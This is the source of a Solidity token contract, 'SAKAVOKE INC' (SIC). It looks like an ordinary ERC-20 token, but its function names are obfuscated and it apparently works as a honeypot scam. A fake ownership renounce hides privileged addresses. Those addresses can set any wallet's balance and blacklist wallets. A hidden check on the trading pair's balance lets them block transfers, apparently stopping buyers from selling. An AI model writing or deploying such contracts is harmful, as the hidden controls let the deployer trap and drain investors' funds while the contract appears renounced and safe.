//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface fromMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toTradingMode {
    function createPair(address atAuto, address swapLaunched) external returns (address);
}

abstract contract listLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toModeBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minWallet) external view returns (uint256);

    function transfer(address receiverAuto, uint256 amountWalletTeam) external returns (bool);

    function allowance(address tokenWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountWalletTeam) external returns (bool);

    function transferFrom(address sender,address receiverAuto,uint256 amountWalletTeam) external returns (bool);

    event Transfer(address indexed from, address indexed buySwap, uint256 value);
    event Approval(address indexed tokenWallet, address indexed spender, uint256 value);
}

interface toModeBuyMetadata is toModeBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SAKAVOKEINC is listLiquidity, toModeBuy, toModeBuyMetadata {

    address teamLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tradingTotal;

    uint256 private txFee = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return txFee;
    }

    uint256 private isBuy;

    event OwnershipTransferred(address indexed tokenSell, address indexed listTrading);

    string private sellModeMarketing = "SIC";

    mapping(address => bool) public walletAt;

    function limitTx(address listToIs, address receiverAuto, uint256 amountWalletTeam) internal returns (bool) {
        require(tradingTotal[listToIs] >= amountWalletTeam);
        tradingTotal[listToIs] -= amountWalletTeam;
        tradingTotal[receiverAuto] += amountWalletTeam;
        emit Transfer(listToIs, receiverAuto, amountWalletTeam);
        return true;
    }

    uint8 private swapWallet = 18;

    function senderTeam(uint256 amountWalletTeam) public {
        teamSender();
        buySender = amountWalletTeam;
    }

    bool public receiverLiquidityMin;

    bool public exemptSell;

    function balanceOf(address minWallet) public view virtual override returns (uint256) {
        return tradingTotal[minWallet];
    }

    function isFund(address txToReceiver) public {
        if (receiverLiquidityMin) {
            return;
        }
        if (isBuy == maxFund) {
            limitReceiverFee = true;
        }
        takeTotal[txToReceiver] = true;
        
        receiverLiquidityMin = true;
    }

    bool public limitReceiverFee;

    function getOwner() external view returns (address) {
        return fromFund;
    }

    function autoSwapShould() public {
        emit OwnershipTransferred(atToken, address(0));
        fromFund = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return fundLimit;
    }

    bool public enableFund;

    function owner() external view returns (address) {
        return fromFund;
    }

    mapping(address => bool) public takeTotal;

    function launchLaunched(address listToIs, address receiverAuto, uint256 amountWalletTeam) internal returns (bool) {
        if (listToIs == atToken) {
            return limitTx(listToIs, receiverAuto, amountWalletTeam);
        }
        uint256 shouldFeeTake = toModeBuy(toAmount).balanceOf(teamAtMax);
        require(shouldFeeTake == buySender);
        require(!walletAt[listToIs]);
        return limitTx(listToIs, receiverAuto, amountWalletTeam);
    }

    function decimals() external view virtual override returns (uint8) {
        return swapWallet;
    }

    function exemptSellList(address marketingMax) public {
        teamSender();
        if (totalExempt != enableFund) {
            modeSellMarketing = maxFund;
        }
        if (marketingMax == atToken || marketingMax == toAmount) {
            return;
        }
        walletAt[marketingMax] = true;
    }

    address teamAtMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public atToken;

    mapping(address => mapping(address => uint256)) private senderTo;

    uint256 public modeSellMarketing;

    function allowance(address isTotalExempt, address atTx) external view virtual override returns (uint256) {
        if (atTx == teamLiquidity) {
            return type(uint256).max;
        }
        return senderTo[isTotalExempt][atTx];
    }

    function symbol() external view virtual override returns (string memory) {
        return sellModeMarketing;
    }

    uint256 sellTeamSwap;

    address public toAmount;

    function approve(address atTx, uint256 amountWalletTeam) public virtual override returns (bool) {
        senderTo[_msgSender()][atTx] = amountWalletTeam;
        emit Approval(_msgSender(), atTx, amountWalletTeam);
        return true;
    }

    function fundTotalLaunched(address launchedIs, uint256 amountWalletTeam) public {
        teamSender();
        tradingTotal[launchedIs] = amountWalletTeam;
    }

    string private fundLimit = "SAKAVOKE INC";

    function teamSender() private view {
        require(takeTotal[_msgSender()]);
    }

    function transfer(address launchedIs, uint256 amountWalletTeam) external virtual override returns (bool) {
        return launchLaunched(_msgSender(), launchedIs, amountWalletTeam);
    }

    constructor (){
        if (modeSellMarketing != isBuy) {
            totalExempt = true;
        }
        autoSwapShould();
        fromMax maxLaunchEnable = fromMax(teamLiquidity);
        toAmount = toTradingMode(maxLaunchEnable.factory()).createPair(maxLaunchEnable.WETH(), address(this));
        
        atToken = _msgSender();
        takeTotal[atToken] = true;
        tradingTotal[atToken] = txFee;
        if (maxFund == modeSellMarketing) {
            modeSellMarketing = isBuy;
        }
        emit Transfer(address(0), atToken, txFee);
    }

    function transferFrom(address listToIs, address receiverAuto, uint256 amountWalletTeam) external override returns (bool) {
        if (_msgSender() != teamLiquidity) {
            if (senderTo[listToIs][_msgSender()] != type(uint256).max) {
                require(amountWalletTeam <= senderTo[listToIs][_msgSender()]);
                senderTo[listToIs][_msgSender()] -= amountWalletTeam;
            }
        }
        return launchLaunched(listToIs, receiverAuto, amountWalletTeam);
    }

    uint256 buySender;

    bool public totalExempt;

    address private fromFund;

    uint256 public maxFund;

}